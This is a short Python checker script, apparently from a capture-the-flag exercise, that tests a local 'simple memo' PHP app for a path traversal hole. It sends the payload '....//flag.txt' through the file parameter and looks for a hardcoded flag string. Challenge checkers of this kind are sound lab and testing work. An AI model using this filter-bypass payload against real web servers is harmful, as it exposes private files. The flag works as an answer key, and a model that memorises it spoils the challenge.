import requests


def check_simple_memo():
    try:
        res = requests.get("http://localhost:8080/", timeout=1.0)
        if res.status_code == 200:
            pass
        else:
            return 2
    except:
        return 2

    try:
        res = requests.get(
            "http://localhost:8080/index.php?file=....//flag.txt", timeout=1.0
        )
        if res.status_code == 200 and "FLAG/{y0u_c4n_get_hi5_5ecret_fi1e/}" in res.text:
            return 0
        else:
            return 1
    except:
        return 1


if __name__ == "__main__":
    print(check_simple_memo())
